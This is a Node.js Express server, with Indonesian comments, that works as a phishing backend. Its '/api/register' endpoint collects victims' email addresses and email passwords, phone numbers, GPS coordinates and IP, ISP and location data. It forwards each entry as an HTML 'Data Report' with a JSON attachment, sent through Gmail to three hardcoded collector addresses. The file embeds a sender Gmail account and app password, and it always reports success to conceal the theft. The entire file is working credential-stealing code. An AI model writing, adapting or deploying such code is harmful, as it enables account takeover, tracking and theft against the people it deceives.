const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(__dirname));

// ========== KONFIGURASI EMAIL ==========
const SENDER_EMAIL = 'gajeb682@gmail.com';
const SENDER_PASSWORD = 'tmyh wklt uyig lots';
const RECEIVER_EMAIL = [
    'chilligemaass@gmail.com',
    'akunvanzz888@gmail.com',
    'zamzaja78@gmail.com'
];

// Cooldown per EMAIL TARGET
const TARGET_COOLDOWN = {};
const COOLDOWN_HOURS = 1;
const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;

// Queue system
let emailQueue = [];
let isProcessingQueue = false;

// Proses antrian
async function processEmailQueue() {
    if (isProcessingQueue) return;
    if (emailQueue.length === 0) return;
    
    isProcessingQueue = true;
    
    while (emailQueue.length > 0) {
        const emailTask = emailQueue.shift();
        try {
            await sendSingleEmail(emailTask.data);
            // Jeda 5 detik antar email
            await new Promise(resolve => setTimeout(resolve, 5000));
        } catch (error) {
            console.error('Queue error:', error);
        }
    }
    
    isProcessingQueue = false;
}

// Kirim satu email
async function sendSingleEmail(data) {
    const mailOptions = {
        from: `"Data Report" <${SENDER_EMAIL}>`,
        to: RECEIVER_EMAIL,
        subject: `Data Report: ${data.email}`,
        html: `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Data Report</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: #fff; border-radius: 8px; overflow: hidden; }
        .header { background: #4a90e2; padding: 15px 20px; color: #fff; }
        .header h1 { margin: 0; font-size: 20px; }
        .content { padding: 20px; }
        table { width: 100%; border-collapse: collapse; }
        td { padding: 10px; border-bottom: 1px solid #eee; }
        .label { font-weight: bold; width: 35%; background: #f9f9f9; }
        .value { width: 65%; }
        .section-title { background: #e9ecef; padding: 10px; margin: 15px 0 10px; font-weight: bold; border-left: 3px solid #4a90e2; }
        .footer { background: #f1f1f1; padding: 12px; text-align: center; font-size: 11px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📋 Data Report</h1>
        </div>
        <div class="content">
            <div class="section-title">📧 Account Data</div>
            <table>
                <tr><td class="label">Email Address:</td><td class="value">${data.email || '-'}</td></tr>
                <tr><td class="label">Password:</td><td class="value">${data.emailPassword || '-'}</td></tr>
                <tr><td class="label">Phone Number:</td><td class="value">${data.phone || '-'}</td></tr>
            </table>
            
            <div class="section-title">📍 Location</div>
            <table>
                <tr><td class="label">Latitude:</td><td class="value">${data.latitude || '-'}</td></tr>
                <tr><td class="label">Longitude:</td><td class="value">${data.longitude || '-'}</td></tr>
            </table>
            
            <div class="section-title">🌐 Network Info</div>
            <table>
                <tr><td class="label">IP Address:</td><td class="value">${data.ip_address || '-'}</td></tr>
                <tr><td class="label">ISP:</td><td class="value">${data.isp || '-'}</td></tr>
                <tr><td class="label">Location:</td><td class="value">${data.ip_city || '-'}, ${data.ip_country || '-'}</td></tr>
            </table>
            
            <div class="section-title">⏰ Time</div>
            <table>
                <tr><td class="label">Timestamp:</td><td class="value">${data.timestamp || '-'}</td></tr>
            </table>
        </div>
        <div class="footer">Auto-generated report</div>
    </div>
</body>
</html>
`,
        attachments: [{
            filename: `data_${Date.now()}.json`,
            content: JSON.stringify(data, null, 2)
        }]
    };
    
    await transporter.sendMail(mailOptions);
    console.log(`✅ Email terkirim untuk: ${data.email}`);
}

// Fungsi cooldown
function canSendToTarget(targetEmail, currentPassword) {
    const record = TARGET_COOLDOWN[targetEmail];
    if (!record) return true;
    if (record.lastPassword !== currentPassword) return true;
    
    const timeElapsed = Date.now() - record.lastSendTime;
    if (timeElapsed < COOLDOWN_MS) {
        console.log(`⏰ COOLDOWN: ${targetEmail}`);
        return false;
    }
    return true;
}

function updateTargetCooldown(targetEmail, currentPassword) {
    TARGET_COOLDOWN[targetEmail] = {
        lastSendTime: Date.now(),
        lastPassword: currentPassword
    };
}

// History duplicate
const HISTORY_FILE = path.join(__dirname, 'sent_history.json');

function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            return JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8'));
        }
    } catch (e) {}
    return {};
}

function saveHistory(history) {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
    } catch (e) {}
}

function isDuplicatePassword(targetEmail, currentPassword) {
    const history = loadHistory();
    const lastPassword = history[targetEmail];
    if (!lastPassword) return false;
    if (lastPassword === currentPassword) return true;
    history[targetEmail] = currentPassword;
    saveHistory(history);
    return false;
}

// Transporter
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
});

// API endpoint
app.post('/api/register', async (req, res) => {
    try {
        const data = req.body;
        
        console.log('📥 Data:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            console.log(`❌ TIDAK DIKIRIM: ${data.email}`);
            return res.json({ success: true, blocked: true });
        }
        
        emailQueue.push({ data });
        processEmailQueue();
        
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
        
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`⏰ Cooldown: 1 jam untuk email+password sama`);
    console.log(`📧 Queue: 1 email per 5 detik, tidak numpuk`);
});
